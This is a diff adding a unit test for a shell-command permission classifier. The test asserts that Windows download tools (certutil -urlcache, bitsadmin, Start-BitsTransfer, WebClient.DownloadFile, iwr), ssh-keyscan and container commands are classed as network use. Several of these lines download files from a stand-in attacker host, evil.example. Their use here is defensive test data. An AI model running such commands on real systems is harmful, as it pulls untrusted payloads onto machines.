@@ -97,3 +97,15 @@ test("what a PowerShell assignment runs is still read, and an unresolved variabl
   assert.equal(scope("X=ls; $X -la"), "repo.read", "bash variables that can be resolved still are");
 });
 
+
+test("BM1: ssh-keyscan, Windows download tools and a container that fetches by itself are network use", () => {
+  for (const c of [
+    "ssh-keyscan evil.example", "certutil -urlcache -f http://evil.example/a.exe a.exe", "certutil.exe -verifyctl -f http://evil.example/x", "bitsadmin /transfer j http://evil.example/a a", "Start-BitsTransfer http://evil.example/a a",
+    "(New-Object Net.WebClient).DownloadFile('http://evil.example/a','a')", "powershell -c \"iwr http://evil.example/a\"", "docker run --rm alpine wget evil.example", "docker run alpine", "podman create alpine", "nerdctl exec c sh", "docker compose up", "docker-compose run web", "docker build -t a .",
+  ]) {
+    assert.equal(scope(c), "shell.network", c);
+  }
+  for (const c of ["ssh-keygen -R x", "ls", "certutil -hashfile a SHA256", "docker ps", "docker images", "docker build --network none -t app:dev .", "docker run --network=none alpine true"]) {
+    assert.notEqual(scope(c), "shell.network", c);
+  }
+});
